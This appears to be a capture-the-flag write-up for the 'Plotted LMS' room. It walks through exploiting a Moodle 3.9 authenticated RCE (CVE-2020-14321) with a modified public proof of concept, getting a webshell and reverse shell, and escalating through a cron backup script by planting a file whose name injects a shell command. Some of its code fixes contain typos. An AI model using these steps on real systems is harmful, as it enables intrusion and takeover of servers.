# Plotted LMS

A fairly hard room, largely due to the breadth of the enumeration and its numerous rabbit holes, plus some instability mixed with dickery in the foothold path.

1. A rust scan reveals four websites, 80, 873, 8820 and 9020. All show a default apache page
2. Using ffuf with directory wordlist medium on each, it reveals three sites: :873/rail, :8820/learn and :9020/moodle. The first two look to be custom built, but the last is a regular moodle instance.
3. Running moodlescan against the moodle url, reveals it is version 3.9 beta. This version is vulnerable to CVE-2020-14321, a authenticated remote code execution vulnerability.
4. The vuln requires the creds or cookie of a 'teacher'. Fortunately the site allows registeration, so I register a `test123:Test-123` user. Furthermore, there is a course 'teachers only' that allows self-enrollment, making the new user a teacher.

> The next bit was tricky. It took me four instances of the target VM and a lot of dickery to get the exploit working. Part of it was the author's countermeasures: any request without a referer header would respond with a rickroll message, breaking the script. But aside from that, the exploit itself seemed dependent on a very specific state - any messing about with moodle as I did trying to debug or enumerate would break the script flow, very annoying. In the end, the exact steps described following worked somewhat consistently.

5. On exploit-db, there is a reference impl for this vuln: https://www.exploit-db.com/exploits/50180. Instead of using that directly, I used the original repo referenced: https://github.com/HoangKien1020/CVE-2020-14321
6. Before running, this needs to be modified:
    - on line 9, this line: `headers={"Content-Type":"application/x-www-form-urlencoded"}` should be expanded to include a referer value, e.g. `headers={"Content-Type":"application/x-www-form-urlencoded","Referer": "http://10.10.94.67:9020/moodle/"}`
    - there are two uses of `session.get` in the script that dont specify headers, e.g. line 27~: `r=session.get(login_url,proxies=proxies)`. This should be changed to add the headers variable, e.g. `r=session.get(login_url,proxies=proxies,eaders=headers)`.
7. Running the script like so will hopefully result in output like the following:

    ```bash
    root@ip-10-10-242-204:~# python3 ./cve202014321.py -url http://10.10.94.67:9020/moodle -u test123 -p Test-123 -cmd=ls
                             ***CVE 2020 14321***
        How to use this PoC script
        Case 1. If you have vaid credentials:
        python3 cve202014321.py -u http://test.local:8080 -u teacher -p 1234 -cmd=dir
        Case 2. If you have valid cookie:
        python3 cve202014321.py -u http://test.local:8080 -cookie=37ov37abn9kv22gj7enred9bl7 -cmd=dir

    [+] Your target: http://10.10.94.67:9020/moodle
    [+] Logging in to teacher
    [+] Teacher logins successfully!
    [+] Privilege Escalation To Manager in the course Done!
    [+] Maybe RCE via install plugins!
    [+] Checking RCE ...
    [+] RCE link in here:
    http://10.10.94.67:9020/moodle/blocks/rce/lang/en/block_rce.php?cmd=ls
    block_rce.php

    ```
    
8. with the new webshell we can get a strong reverse shell. I used `https://github.com/NHAS/reverse_ssh` to get a full shell as www-data.
9. To pivot to the `plot_admin` user, there is a cronjob that runs every minute, executing a script called backup.py in the plot_admin user's home directory. The contents of this script are:

    ```python
    import os

    moodle_location = "/var/www/uploadedfiles/filedir/"
    backup_location = "/home/plot_admin/.moodle_backup/"

    os.system("/usr/bin/rm -rf " + backup_location + "*")

    for (root,dirs,files) in os.walk(moodle_location):
            for file in files:
                    os.system('/usr/bin/cp "' + root + '/' + file + '" ' + backup_location)
    ```
    
10. To exploit this, as we have write into `/var/www/uploadedfiles/filedir/`, we can create a file in there like `$(chmod -R 777 ~)`. This can be done with `touch \$\(chmod\ -R\ \~\)` in that folder. Within a minute, all files in plot_admin's home directory will be universally writable.
11. Next, adding `os.system("/path/to/revshell")` into backup.py (after removing the chmod file above, as it breaks the script) will get a reverse shell as plot_admin.
12. 
